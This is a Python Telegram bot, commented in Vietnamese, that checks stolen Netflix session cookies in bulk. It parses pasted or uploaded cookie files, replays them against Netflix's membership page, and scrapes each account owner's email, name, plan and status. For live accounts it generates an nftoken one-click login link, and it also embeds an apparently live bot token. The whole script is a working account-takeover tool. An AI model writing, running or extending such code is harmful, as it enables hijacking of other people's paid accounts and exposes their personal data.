import os
import re
import html
import json
import queue
import random
import string
import sys
import threading
import unicodedata
import http.server
import socketserver
from datetime import datetime, timedelta, timezone
import requests
import telebot
from urllib3.exceptions import InsecureRequestWarning

# Tắt cảnh báo SSL
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# 🔴 THAY THẾ TOKEN BOT CỦA BẠN VÀO ĐÂY (Lấy từ @BotFather)
TELEGRAM_BOT_TOKEN = "8918692221:AAEHCnNef9zBR9rFU8VcwWQQ9O-LIPAG8sA"

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# =========================================================================
# PHẦN 1: TOÀN BỘ LOGIC SCRAFE COOKIE CỦA FILE GỐC (ĐÃ ĐƯỢC ĐƯA VÀO ĐÂY)
# =========================================================================

LOGIN_REQUIRED_NETFLIX_COOKIES = ("NetflixId",)
OPTIONAL_NETFLIX_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
ALL_NETFLIX_COOKIE_NAMES = set(LOGIN_REQUIRED_NETFLIX_COOKIES + OPTIONAL_NETFLIX_COOKIES)
CANONICAL_NETFLIX_COOKIE_NAMES = {name.lower(): name for name in ALL_NETFLIX_COOKIE_NAMES}

def canonicalize_netflix_cookie_name(name):
    normalized = str(name or "").strip()
    return CANONICAL_NETFLIX_COOKIE_NAMES.get(normalized.lower(), normalized)

def is_netflix_domain(domain):
    normalized = str(domain or "").strip()
    if normalized.startswith("#HttpOnly_"):
        normalized = normalized[len("#HttpOnly_"):]
    return "netflix." in normalized.lower()

def is_netflix_cookie_entry(domain, name):
    return canonicalize_netflix_cookie_name(name) in ALL_NETFLIX_COOKIE_NAMES or is_netflix_domain(domain)

def split_netscape_cookie_columns(line):
    stripped = line.strip()
    if not stripped or (stripped.startswith("#") and not stripped.startswith("#HttpOnly_")):
        return []
    if stripped.startswith("#HttpOnly_"):
        stripped = stripped[len("#HttpOnly_"):]
    parts = stripped.split("\t")
    if len(parts) >= 7:
        return parts[:6] + ["\t".join(parts[6:])]
    parts = re.split(r"\s+", stripped, maxsplit=6)
    return parts if len(parts) >= 7 else []

def is_netscape_cookie_line(line):
    parts = split_netscape_cookie_columns(line)
    if len(parts) < 7: return False
    if parts[1].upper() not in ("TRUE", "FALSE") or parts[3].upper() not in ("TRUE", "FALSE"): return False
    return bool(re.match(r"^-?\d+(?:\.\d+)?$", parts[4].strip()))

def build_netscape_cookie_entry(domain, tail_match, path, secure, expires, name, value, position):
    normalized_expires = str(expires or 0).strip()
    if re.fullmatch(r"-?\d+\.\d+", normalized_expires):
        try: normalized_expires = str(int(float(normalized_expires)))
        except: pass
    return {
        "domain": str(domain or "").replace("#HttpOnly_", "", 1),
        "tail_match": "TRUE" if str(tail_match).upper() == "TRUE" else "FALSE",
        "path": str(path or "/"),
        "secure": "TRUE" if str(secure).upper() == "TRUE" else "FALSE",
        "expires": normalized_expires or "0",
        "name": canonicalize_netflix_cookie_name(name),
        "value": str(value or ""),
        "position": position,
    }

def format_netscape_cookie_entry(entry):
    return f"{entry['domain']}\t{entry['tail_match']}\t{entry['path']}\t{entry['secure']}\t{entry['expires']}\t{entry['name']}\t{entry['value']}"

def extract_netscape_cookie_entries(raw_text):
    entries = []
    for index, line in enumerate(raw_text.splitlines()):
        if not is_netscape_cookie_line(line): continue
        parts = split_netscape_cookie_columns(line)
        if len(parts) < 7: continue
        if is_netflix_cookie_entry(parts[0], parts[5]):
            entries.append(build_netscape_cookie_entry(parts[0], parts[1], parts[2], parts[3], parts[4], parts[5], parts[6], index))
    return entries

def extract_json_cookie_entries(content):
    try: json_data = json.loads(content)
    except: return []
    if isinstance(json_data, dict):
        if isinstance(json_data.get("cookies"), list): json_data = json_data["cookies"]
        elif isinstance(json_data.get("items"), list): json_data = json_data["items"]
        else: json_data = [json_data]
    if not isinstance(json_data, list): return []
    entries = []
    for index, cookie in enumerate(json_data):
        if not isinstance(cookie, dict): continue
        domain = cookie.get("domain", "")
        name = canonicalize_netflix_cookie_name(cookie.get("name", ""))
        if is_netflix_cookie_entry(domain, name):
            entries.append(build_netscape_cookie_entry(domain, "TRUE" if str(domain).startswith(".") else "FALSE", cookie.get("path", "/"), "TRUE" if cookie.get("secure", False) else "FALSE", cookie.get("expirationDate", cookie.get("expiration", 0)), name, cookie.get("value", ""), index))
    return entries

def extract_raw_cookie_entries(raw_text):
    pattern = re.compile(rf"(?:['\"])?(?P<name>{'|'.join(sorted((re.escape(name) for name in ALL_NETFLIX_COOKIE_NAMES), key=len, reverse=True))})(?:['\"])?\s*(?:=|:)\s*(?P<value>\"[^\"]*\"|'[^']*'|[^;\s]+)", re.IGNORECASE)
    entries = []
    for index, match in enumerate(pattern.finditer(raw_text)):
        cookie_name = canonicalize_netflix_cookie_name(match.group("name"))
        value = match.group("value")
        if len(value) >= 2 and value[0] == value[-1] and value[0] in {"'", '"'}: value = value[1:-1]
        else: value = value.rstrip(",")
        entries.append(build_netscape_cookie_entry(".netflix.com", "TRUE", "/", "TRUE" if cookie_name == "SecureNetflixId" else "FALSE", "0", cookie_name, value, index))
    return entries

def cookies_dict_from_netscape(netscape_text):
    cookies = {}
    for line in netscape_text.splitlines():
        parts = split_netscape_cookie_columns(line)
        if len(parts) >= 7 and is_netflix_cookie_entry(parts[0], parts[5]):
            cookies[canonicalize_netflix_cookie_name(parts[5])] = parts[6]
    return cookies

def build_cookie_bundles_from_entries(entries):
    if not entries: return []
    entries_by_name = {}
    for entry in entries:
        if entry.get("name"): entries_by_name.setdefault(entry["name"], []).append(entry)
    if not entries_by_name: return []
    bundle_count = len(entries_by_name.get("NetflixId", [])) or max(len(e) for e in entries_by_name.values())
    bundles = []
    for i in range(bundle_count):
        sel = []
        for ne in entries_by_name.values():
            if i < len(ne): sel.append(ne[i])
            elif len(ne) == 1: sel.append(ne[0])
        if not sel: continue
        sel = sorted(sel, key=lambda item: item.get("position", 0))
        txt = "\n".join(format_netscape_cookie_entry(e) for e in sel)
        bundles.append({"index": i + 1, "total": bundle_count, "netscape_text": txt, "cookies": cookies_dict_from_netscape(txt)})
    return bundles

def extract_netflix_cookie_bundles(content):
    for ext in (extract_json_cookie_entries, extract_netscape_cookie_entries, extract_raw_cookie_entries):
        b = build_cookie_bundles_from_entries(ext(content))
        if b: return b
    return []

def decode_netflix_value(value):
    if value is None: return None
    cleaned = html.unescape(str(value))
    for s, t in {"\\x20": " ", "\\u00A0": " ", "\\u00a0": " ", "&nbsp;": " ", "u00A0": " ", "\\/": "/", '\\"': '"', "\\n": " ", "\\t": " "}.items():
        cleaned = cleaned.replace(s, t)
    for _ in range(3):
        prev = cleaned
        cleaned = re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), cleaned)
        cleaned = re.sub(r"\\x([0-9a-fA-F]{2})", lambda m: chr(int(m.group(1), 16)), cleaned)
        if cleaned == prev: break
    return re.sub(r"\s+", " ", cleaned).strip() or None

def extract_first_match(text, patterns, flags=0):
    for p in patterns:
        m = re.search(p, text, flags)
        if m: return decode_netflix_value(m.group(1))
    return None

def extract_profile_names(text):
    names = []
    for p in [r'"profileName"\s*:\s*"([^"]+)"', r'"profileName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"']:
        for f in re.findall(p, text, re.DOTALL):
            d = decode_netflix_value(f)
            if d and d not in names: names.append(d)
    return ", ".join(names) if names else None

def extract_info(text):
    return {
        "email": extract_first_match(text, [r'"emailAddress"\s*:\s*"([^"]+)"', r'"email"\s*:\s*"([^"]+)"']),
        "countryOfSignup": extract_first_match(text, [r'"currentCountry"\s*:\s*"([^"]+)"', r'"countryOfSignup":\s*"([^"]+)"']),
        "membershipStatus": extract_first_match(text, [r'"membershipStatus":\s*"([^"]+)"']),
        "localizedPlanName": extract_first_match(text, [r'"planName"\s*:\s*"([^"]+)"', r'"localizedPlanName"\s*:\s*"([^"]+)"']),
        "accountOwnerName": extract_first_match(text, [r'"accountOwnerName"\s*:\s*"([^"]+)"', r'"firstName"\s*:\s*"([^"]+)"']),
        "profilesDisplay": extract_profile_names(text)
    }

def is_subscribed_account(info):
    status = str(info.get("membershipStatus") or "").lower()
    return "current_member" in status or "active" in status

def is_on_hold_account(info):
    status = str(info.get("membershipStatus") or "").lower()
    return any(t in status for t in ("hold", "past_due", "payment_retry", "paused", "suspend"))

def country_code_to_flag(code):
    raw = str(code or "").strip().upper()
    if len(raw) == 2 and raw.isalpha():
        return "".join(chr(127397 + ord(c)) for c in raw)
    return ""

def create_nftoken(cookie_dict, attempts=1):
    netflix_id = decode_netflix_value(cookie_dict.get("NetflixId"))
    if not netflix_id: return None, "Missing cookies"
    url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
    params = {"appVersion": "15.48.1", "path": '["account","token","default"]', "responseFormat": "json"}
    headers = {"User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5)", "Cookie": f"NetflixId={netflix_id}"}
    try:
        r = requests.get(url, params=params, headers=headers, timeout=15, verify=False)
        if r.status_code == 200:
            tk = r.json().get("value", {}).get("account", {}).get("token", {}).get("default", {}).get("token")
            if tk: return {"token": tk}, None
    except: pass
    return None, "Error"

# =========================================================================
# PHẦN 2: WEB SERVER GIẢ LẬP ĐỂ KHÔNG BỊ QUÉT LỖI TRÊN RENDER GÓI FREE
# =========================================================================

def run_dummy_web_server():
    port = int(os.environ.get("PORT", 10000))
    class DummyHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/plain; charset=utf-8")
            self.end_headers()
            self.wfile.write("Bot Checker Netflix Online 24/7!".encode("utf-8"))
    with socketserver.TCPServer(("", port), DummyHandler) as httpd:
        print(f"🌍 Web Server giả lập đang lắng nghe tại cổng: {port}")
        httpd.serve_forever()

# =========================================================================
# PHẦN 3: GIAO DIỆN BOT TELEGRAM INTERACTIVE
# =========================================================================

def get_inline_restart_keyboard():
    markup = telebot.types.InlineKeyboardMarkup()
    btn_restart = telebot.types.InlineKeyboardButton("🔄 Kiểm tra tài khoản tiếp theo", callback_data="restart_bot")
    markup.add(btn_restart)
    return markup

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    welcome_text = (
        "👋 **Chào mừng bạn đến với Netflix Cookie Checker Bot!**\n\n"
        "⚡ **Cách sử dụng rất đơn giản:**\n"
        "1️⃣ **Cách 1:** Copy nội dung cookie và dán (Paste) thẳng văn bản vào đây.\n"
        "2️⃣ **Cách 2:** Gửi file định dạng `.txt` hoặc `.json` chứa cookie lên.\n\n"
        "Bot hoạt động 24/7, tự động quét trạng thái **LIVE / FREE / ON HOLD**!"
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")

@bot.message_handler(content_types=['text'])
def handle_cookie_text(message):
    if message.text.startswith('/'): return
    sent_msg = bot.reply_to(message, "⏳ Đang phân tích dữ liệu cookie, vui lòng đợi...")
    threading.Thread(target=process_cookie_data, args=(message.text, "Nhập trực tiếp", message, sent_msg)).start()

@bot.message_handler(content_types=['document'])
def handle_cookie_file(message):
    file_name = message.document.file_name
    if not file_name.lower().endswith(('.txt', '.json')):
        bot.reply_to(message, "❌ Vui lòng gửi file `.txt` hoặc `.json`!")
        return
    sent_msg = bot.reply_to(message, "⏳ Đang xử lý file cookie của bạn...")
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        content = downloaded.decode("utf-8", errors="ignore")
        threading.Thread(target=process_cookie_data, args=(content, file_name, message, sent_msg)).start()
    except Exception as e:
        bot.edit_message_text(f"⚠️ Lỗi đọc file: {str(e)}", sent_msg.chat.id, sent_msg.message_id)

def process_cookie_data(raw_content, source_name, original_msg, progress_msg):
    try:
        bundles = extract_netflix_cookie_bundles(raw_content)
        if not bundles:
            bot.edit_message_text("❌ Không định dạng được cookie Netflix hợp lệ!", progress_msg.chat.id, progress_msg.message_id, reply_markup=get_inline_restart_keyboard())
            return
            
        bot.edit_message_text(f"🔍 Tìm thấy {len(bundles)} tài khoản. Đang kiểm tra kết nối mạng...", progress_msg.chat.id, progress_msg.message_id)
        
        success_count = 0
        final_report = ""
        
        for idx, bundle in enumerate(bundles):
            netscape_text = bundle.get("netscape_text", "")
            cookies = bundle.get("cookies") or cookies_dict_from_netscape(netscape_text)
            
            session = requests.Session()
            session.cookies.update(cookies)
            
            try:
                # Gửi yêu cầu lấy trang thành viên trực tiếp bảo mật
                r = session.get("https://www.netflix.com/account/membership", headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
                if r.status_code == 200 and r.text:
                    info = extract_info(r.text)
                    country = info.get("countryOfSignup") or "US"
                    flag = country_code_to_flag(country)
                    
                    is_subscribed = is_subscribed_account(info)
                    account_on_hold = is_subscribed and is_on_hold_account(info)
                    
                    if account_on_hold:
                        status_str = "⚠️ **ON HOLD** (Lỗi cổng thanh toán)"
                    elif is_subscribed:
                        status_str = "🔥 **LIVE** (Tài khoản hoạt động mượt)"
                    else:
                        status_str = "❄️ **FREE** (Hết hạn gói / Không cước)"
                        
                    plan_name = info.get("localizedPlanName") or "Unknown Plan"
                    
                    nftoken_data, _ = create_nftoken(cookies)
                    nftoken_link_str = ""
                    if is_subscribed and nftoken_data:
                        nftoken_link_str = f"\n🌐 **Link đăng nhập nhanh:** https://netflix.com/?nftoken={nftoken_data['token']}"
                        
                    final_report += (
                        f"📝 **Tài khoản #{idx+1}**\n"
                        f"▪️ Trạng thái: {status_str}\n"
                        f"▪️ Quốc gia: {country} {flag}\n"
                        f"▪️ Gói cước: {plan_name}\n"
                        f"▪️ Email: `{info.get('email', 'N/A')}`\n"
                        f"▪️ Chủ tài khoản: {info.get('accountOwnerName', 'N/A')}\n"
                        f"{nftoken_link_str}\n\n"
                    )
                    success_count += 1
                    continue
            except:
                pass
            final_report += f"❌ **Tài khoản #{idx+1}:** Cookie Die hoặc lỗi mạng.\n\n"

        header = f"📊 **KẾT QUẢ CHECK COOKIE**\n📦 Nguồn: {source_name}\n✅ LIVE/FREE: {success_count}/{len(bundles)}\n----------------------------------------\n"
        bot.delete_message(progress_msg.chat.id, progress_msg.message_id)
        bot.send_message(original_msg.chat.id, header + final_report, parse_mode="Markdown", disable_web_page_preview=True, reply_markup=get_inline_restart_keyboard())
        
    except Exception as e:
        bot.edit_message_text(f"⚠️ Có lỗi hệ thống: {str(e)}", progress_msg.chat.id, progress_msg.message_id, reply_markup=get_inline_restart_keyboard())

@bot.callback_query_handler(func=lambda call: call.data == "restart_bot")
def callback_restart(call):
    bot.answer_callback_query(call.id)
    send_welcome(call.message)

bot.set_my_commands([telebot.types.BotCommand("start", "🔄 Khởi động lại Bot / Hướng dẫn")])

# Kích hoạt máy chủ web giả lập để giữ máy chủ Render hoạt động không bị sleep
threading.Thread(target=run_dummy_web_server, daemon=True).start()

print("🤖 Bot Telegram đã tích hợp gộp lõi thành công và đang khởi chạy...")
bot.infinity_polling()
